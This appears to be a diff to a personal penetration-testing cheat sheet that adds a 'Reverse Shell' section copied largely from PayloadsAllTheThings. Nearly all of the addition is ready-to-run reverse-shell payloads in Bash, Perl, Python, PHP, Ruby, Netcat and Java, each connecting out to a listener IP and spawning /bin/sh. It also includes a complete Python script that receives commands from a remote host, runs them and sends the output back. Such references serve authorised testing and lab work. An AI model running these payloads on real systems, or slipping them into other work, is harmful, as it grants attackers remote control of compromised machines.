@@ -386,6 +386,107 @@ Python3
 python3 -m http.server
 ```
 
+### [](#header-3)Reverse Shell
+
+This shells is mostly from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank">here</a>. This site is a very good referense for reverse shells.
+
+Bash
+
+```
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+
+```
+/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'
+```
+
+```
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+```
+Perl
+
+```
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+Python2
+
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Python3
+
+```
+#!/usr/bin/python
+
+import os
+import socket
+import subprocess
+
+HOST = '192.168.1.100' # The ip of the listener.
+PORT = 4444 # The same port as listener.
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT)) # Connect to listener.
+s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.
+
+while 1: # Start loop.
+    data = s.recv(1024).decode("UTF-8") # Recieve shell command.
+    if data == "quit": 
+        break # If it's quit, then break out and close socket.
+    if data[:2] == "cd":
+        os.chdir(data[3:]) # If it's cd, change directory.
+    # Run shell command.
+    if len(data) > 0:
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+        stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
+        output_str = str(stdout_value, "UTF-8") # Format output.
+        currentWD = os.getcwd() + "> " # Get current working directory.
+        s.send(str.encode(currentWD + output_str)) # Send output to listener.
+    
+s.close() # Close socket.
+```
+
+PHP
+
+```
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+Ruby
+
+```
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+Netcat
+
+```
+nc -e /bin/sh 10.0.0.1 1234
+```
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
+Netcat OpenBSD
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+
+Java
+
+```
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+
+
+
 ### [](#header-3)Misc
 
 Last edited files (10 minutes).
